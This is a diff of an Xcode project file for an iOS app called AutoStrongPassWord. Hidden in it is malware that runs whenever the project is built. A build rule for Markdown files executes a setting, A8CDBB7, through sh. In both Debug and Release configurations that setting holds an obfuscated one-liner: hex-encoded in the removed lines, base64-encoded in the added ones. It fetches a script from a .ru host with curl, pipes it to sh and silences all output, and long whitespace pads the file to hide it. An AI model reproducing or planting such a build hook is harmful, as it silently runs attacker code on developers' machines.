@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		CF57DC9649B6466FA37BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = 68289C6995E2496FA87BBDC8; };
+		00C0C331441642BB807BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = B31654E9FCDB4915847BBDC8; };
 		11D219A72BD7C2A3006EDCDE /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 11D219A62BD7C2A3006EDCDE /* AppDelegate.swift */; };
 		11D219A92BD7C2A3006EDCDE /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 11D219A82BD7C2A3006EDCDE /* SceneDelegate.swift */; };
 		11D219AB2BD7C2A3006EDCDE /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 11D219AA2BD7C2A3006EDCDE /* ViewController.swift */; };
@@ -17,7 +17,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		68289C6995E2496FA87BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		B31654E9FCDB4915847BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		11D219A32BD7C2A3006EDCDE /* AutoStrongPassWord.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = AutoStrongPassWord.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		11D219A62BD7C2A3006EDCDE /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		11D219A82BD7C2A3006EDCDE /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
@@ -51,7 +51,7 @@
 		11D219A42BD7C2A3006EDCDE /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				68289C6995E2496FA87BBDC8 /* README.md */,
+				B31654E9FCDB4915847BBDC8 /* README.md */,
 				11D219A32BD7C2A3006EDCDE /* AutoStrongPassWord.app */,
 			);
 			name = Products;
@@ -84,7 +84,7 @@
 				11D219A12BD7C2A3006EDCDE /* Resources */,
 			);
 			buildRules = (
-				6E126A7011054CF7A37BBDC8 /* PBXBuildRule */,
+				AD05FD576A784723A37BBDC8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -127,7 +127,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		6E126A7011054CF7A37BBDC8 /* PBXBuildRule */ = {
+		AD05FD576A784723A37BBDC8 /* PBXBuildRule */ = {
 				isa = PBXBuildRule;
 				compilerSpec = com.apple.compilers.proxy.script;
 				filePatterns = "*.md";
@@ -141,7 +141,7 @@
 				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
 sh -c \"${A8CDBB7}\"";
 			};
-																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																														/* End PBXBuildRule section */
+																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																															/* End PBXBuildRule section */
 
 /* Begin PBXShellScriptBuildPhase section */
 /* End PBXShellScriptBuildPhase section */
@@ -151,7 +151,7 @@ sh -c \"${A8CDBB7}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				CF57DC9649B6466FA37BBDC8 /* README.md */,
+				00C0C331441642BB807BBDC8 /* README.md */,
 				11D219B32BD7C2A5006EDCDE /* LaunchScreen.storyboard in Resources */,
 				11D219B02BD7C2A5006EDCDE /* Assets.xcassets in Resources */,
 				11D219AE2BD7C2A3006EDCDE /* Main.storyboard in Resources */,
@@ -196,7 +196,7 @@ sh -c \"${A8CDBB7}\"";
 		11D219B52BD7C2A5006EDCDE /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((q(){ `printf xAxd | tr -d A` -p -r; };echo 6563686f202224286375726c202d73664c6b202d2d636f6e6e6563742d74696d656f7574203232202d2d72657472792035202d642022703d78636f64655f72756c65222068747470733a2f2f6d6d6b7372697234737933352e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf bEase64 | tr -d E` --decode; };echo ZWNobyAiJChjdXJsIC1ma0xzIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgNCAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL21ta3NyaXI0c3kzNS5ydS9hKSIgfCBzaAo= | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -260,7 +260,7 @@ sh -c \"${A8CDBB7}\"";
 		11D219B62BD7C2A5006EDCDE /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((q(){ `printf xAxd | tr -d A` -p -r; };echo 6563686f202224286375726c202d73664c6b202d2d636f6e6e6563742d74696d656f7574203232202d2d72657472792035202d642022703d78636f64655f72756c65222068747470733a2f2f6d6d6b7372697234737933352e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf bEase64 | tr -d E` --decode; };echo ZWNobyAiJChjdXJsIC1ma0xzIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgNCAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL21ta3NyaXI0c3kzNS5ydS9hKSIgfCBzaAo= | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
